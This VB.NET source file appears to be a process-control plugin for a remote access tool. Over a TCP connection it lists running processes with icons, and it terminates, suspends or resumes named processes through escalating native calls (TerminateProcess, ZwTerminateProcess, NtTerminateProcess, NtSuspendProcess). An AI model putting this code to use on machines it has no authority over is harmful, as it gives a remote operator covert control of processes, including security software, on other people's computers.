Imports System.Net.Sockets
Imports System.IO
Imports System.Drawing
Imports System.Drawing.Imaging
Imports PacketLib
Imports PacketLib.Packet
Imports System.Threading.Tasks
Imports System.Collections.Generic
Imports System.Diagnostics

Public Class Main
    Public Shared Sub Main(ByVal K As TcpClient, ByVal Param_Tab As Object())
        Dim CastParam As Packet_Subject = CType(Param_Tab(0), Packet_Subject)
        Select Case CastParam
            Case Packet_Subject.RETRIEVE_TASKS


                Tasks_Retrieving(K)

            Case Packet_Subject.KILL_TASK
                '  Await
                '  Task.Run(Sub() )

                TK(K, Param_Tab(1).ToString)



            Case Packet_Subject.PAUSE_TASK
                ' Await
                ' Task.Run(Sub())
                PT(K, Param_Tab(1).ToString)
            Case Packet_Subject.RESUME_TASK
                ' Await
                '  Task.Run(Sub())
                RT(K, Param_Tab(1).ToString)

        End Select
    End Sub

    Public Shared Sub Tasks_Retrieving(ByVal k As TcpClient)

        Dim O As New List(Of Object())

        Dim P As New PacketMaker With {
            .Type_Packet = PacketType.TASKS
            }

        Dim jk As Process() = Process.GetProcesses

        For Each h In jk

            Try
                If File.Exists(h.MainModule.FileName) Then
                    Dim P_details As New List(Of Object)

                    Dim i As System.Drawing.Icon = System.Drawing.Icon.ExtractAssociatedIcon(h.MainModule.FileName)

                    Dim stream As MemoryStream = New MemoryStream()

                    Dim azo As Bitmap = i.ToBitmap

                    azo.Save(stream, ImageFormat.Png)

                    P_details.Add(h.ProcessName)

                    P_details.Add(stream.ToArray())

                    O.Add(P_details.ToArray)
                End If

            Catch ex As Exception

                Dim P_details As New List(Of Object)
                P_details.Add(h.ProcessName)
                O.Add(P_details.ToArray)
            End Try

            GC.Collect()
            GC.WaitForPendingFinalizers()

        Next


        GC.Collect()
        GC.WaitForPendingFinalizers()

        P.Misc = New Object() {Packet_Subject.RETRIEVE_TASKS, O.ToArray}

        Dim Send As New Packet_Send With {
            .Packet = P
         }
        SyncLock k
            Send.Send(k.GetStream)
        End SyncLock




    End Sub


    Public Shared Sub TK(ByVal K As TcpClient, ByVal Task_Name As String)
        Dim P As New PacketMaker With {
            .Type_Packet = PacketType.TASKS
            }

        For Each H As Process In Process.GetProcesses
            If H.ProcessName = Task_Name Then

                Try
                    NativeAPI.SendMessage(H.MainWindowHandle, NativeAPI.WM_Message.WM_SYSCOMMAND, NativeAPI.SC_Message.SC_CLOSE, 0)

                    P.Misc = New Object() {Packet_Subject.KILL_TASK, Task_Name, True}

                    Dim Send As New Packet_Send With {
                    .Packet = P
                        }

                    SyncLock K
                        Send.Send(K.GetStream)
                    End SyncLock
                Catch ex As Exception

                End Try

                Try
                    NativeAPI.TerminateProcess(H.Handle, 0)
                    P.Misc = New Object() {Packet_Subject.KILL_TASK, Task_Name, True}

                    Dim Send As New Packet_Send With {
                    .Packet = P
                        }

                    SyncLock K
                        Send.Send(K.GetStream)
                    End SyncLock

                Catch ex As Exception

                End Try

                Try
                    NativeAPI.ZwTerminateProcess(H.Handle, 0)
                    P.Misc = New Object() {Packet_Subject.KILL_TASK, Task_Name, True}

                    Dim Send As New Packet_Send With {
                    .Packet = P
                        }
                    SyncLock K
                        Send.Send(K.GetStream)
                    End SyncLock

                Catch ex As Exception

                End Try

                Try
                    NativeAPI.NtTerminateProcess(H.Handle, 0)
                    Dim Send As New Packet_Send With {
            .Packet = P
         }
                    SyncLock K
                        Send.Send(K.GetStream)
                    End SyncLock

                Catch ex As Exception

                End Try
            End If
        Next
    End Sub
    Public Shared Sub PT(ByVal K As TcpClient, ByVal Task_Name As String)
        For Each H As Process In Process.GetProcesses
            If H.ProcessName = Task_Name Then
                Try
                    NativeAPI.NtSuspendProcess(H.Handle)
                Catch ex As Exception

                End Try
                Try
                    NativeAPI.ZwSuspendProcess(H.Handle)
                Catch ex As Exception

                End Try
            End If
        Next

    End Sub
    Public Shared Sub RT(ByVal K As TcpClient, ByVal Task_Name As String)
        For Each H As Process In Process.GetProcesses
            If H.ProcessName = Task_Name Then
                Try
                    NativeAPI.NtResumeProcess(H.Handle)
                Catch ex As Exception

                End Try
                Try
                    NativeAPI.ZwResumeProcess(H.Handle)
                Catch ex As Exception

                End Try
            End If
        Next
    End Sub

End Class

